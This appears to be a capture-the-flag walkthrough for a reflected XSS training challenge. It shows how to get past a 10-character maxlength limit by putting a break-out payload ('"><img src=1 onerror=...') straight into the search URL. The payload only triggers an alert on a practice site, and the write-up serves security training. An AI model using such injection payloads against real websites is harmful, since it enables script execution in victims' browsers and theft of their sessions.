# Challenge #2 - Poema Reading Club 3

URL: http://2.challenge.xss.site

## Objectives

- You should prove them wrong and demonstrate how you can still run JavaScript code in one of the vulnerable user input channels.

## What you will learn

- How to bypass simple client-side input validation
- How to perform basic XSS exploitation

## Hints

- XSS Reflected

## Steps

Open the challenge page.

http://2.challenge.xss.site/

This time, the term input has a maxlength of 10 characters.

Source:
<input type="text" name="term" id="search-text" value="" maxlength="10" />

Add anything on search input and click on go.

Search term: example

Search url:
http://2.challenge.xss.site/search.php?term=example

Looking in the source code you will find the term reflected as below.

<img src="images/404.png" title="example">

To show the alert box we need send the follow payload.

"><img src=1 onerror="alert(document.domain)

Just add the payload to the search url replacing your search term.

http://2.challenge.xss.site/search.php?term="><img hidden src=1 onerror="alert(document.domain)




